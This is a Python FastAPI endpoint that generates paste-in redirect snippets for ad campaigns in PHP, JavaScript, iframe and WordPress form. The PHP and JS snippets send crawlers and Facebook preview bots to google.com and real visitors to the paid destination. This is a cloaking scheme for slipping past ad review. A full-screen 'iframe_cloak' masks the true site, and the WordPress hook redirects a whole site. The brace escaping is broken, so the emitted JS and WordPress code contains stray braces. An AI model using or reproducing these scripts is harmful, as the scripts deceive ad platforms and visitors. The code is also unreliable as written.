from fastapi import APIRouter, Depends, Request
from sqlalchemy.orm import Session
from app.database import get_db
from app.models.campaign import Campaign

router = APIRouter(prefix="/tools", tags=["Tools"])


@router.get("/script/{slug}")
def generate_script(slug: str, request: Request, db: Session = Depends(get_db)):

    # 🔥 detect domain safely
    host = (
        request.headers.get("x-forwarded-host")
        or request.headers.get("host")
        or "traffic-intelligence-saas.onrender.com"
    )

    domain = f"https://{host}"

    # 🔥 get campaign
    campaign = db.query(Campaign).filter(Campaign.slug == slug).first()

    # 🔥 safe fallback
    source = "direct"
    if campaign and campaign.traffic_source:
        source = campaign.traffic_source

    # 🔥 final redirect URL
    redirect_url = f"{domain}/r/{slug}?utm_source={source}&utm_medium=paid"

    return {
        "direct_link": redirect_url,
        # =========================
        # 🔥 PHP SCRIPT
        # =========================
        "php_script": f"""<?php
date_default_timezone_set("UTC");
ini_set("display_errors", 0);

$url = "{redirect_url}";
$query = $_SERVER["QUERY_STRING"] ?? "";
$ua = $_SERVER["HTTP_USER_AGENT"] ?? "";
$ip = $_SERVER["REMOTE_ADDR"] ?? "";

// basic bot filter (safe)
$is_bot = preg_match('/bot|crawl|spider|facebook|preview/i', $ua);

// build final URL
$final = $url;
if (!empty($query)) {{
    $final .= (strpos($url, "?") !== false ? "&" : "?") . $query;
}}

// headers
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
header("Referrer-Policy: no-referrer");

// optional cookie
setcookie("_ti", md5($ip.$ua), time()+86400, "/");

// redirect
if ($is_bot) {{
    header("Location: https://www.google.com", true, 302);
}} else {{
    header("Location: " . $final, true, 302);
}}

exit;
?>""",
        # =========================
        # 🔥 JS LOADER
        # =========================
        "js_loader": f"""<script>
(function() {{{{
  try {{{{
    var base = "{redirect_url}";
    var q = window.location.search ? window.location.search.substring(1) : "";

    if (window.__ti_redirected) return;
    window.__ti_redirected = true;

    var ua = navigator.userAgent.toLowerCase();
    var isBot = /bot|crawl|spider|preview|facebookexternalhit/.test(ua);

    var finalUrl = base;

    if (q) {{{{
      finalUrl += (base.indexOf("?") !== -1 ? "&" : "?") + q;
    }}}}

    setTimeout(function() {{{{
      if (isBot) {{{{
        window.location.replace("https://www.google.com");
      }}}} else {{{{
        window.location.replace(finalUrl);
      }}}}
    }}}}, 50);

  }}}} catch (e) {{{{
    window.location.replace("{redirect_url}");
  }}}}
}}}})();
</script>""",
        # =========================
        # 🔥 IFRAME
        # =========================
        "iframe_cloak": f"""<iframe 
src="{redirect_url}" 
width="100%" 
height="100%" 
style="border:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;"
referrerpolicy="no-referrer"
sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
loading="eager"
></iframe>

<script>
(function() {{{{
  try {{{{
    setTimeout(function() {{{{
      var iframe = document.querySelector("iframe");
      if (!iframe) {{{{
        window.location.replace("{redirect_url}");
      }}}}
    }}}}, 1000);
  }}}} catch(e) {{{{
    window.location.replace("{redirect_url}");
  }}}}
}}}})();
</script>
""",
        # =========================
        # 🔥 WORDPRESS
        # =========================
        "wordpress_snippet": f"""add_action('template_redirect', function() {{{{

    if (is_admin()) return;

    if (strpos($_SERVER['REQUEST_URI'], '/r/') !== false) return;

    $url = '{redirect_url}';

    if (!empty($_SERVER['QUERY_STRING'])) {{{{
        $url .= (strpos($url, '?') !== false ? '&' : '?') . $_SERVER['QUERY_STRING'];
    }}}}

    nocache_headers();

    wp_safe_redirect($url, 302);
    exit;

}}}}}}}});""",
    }
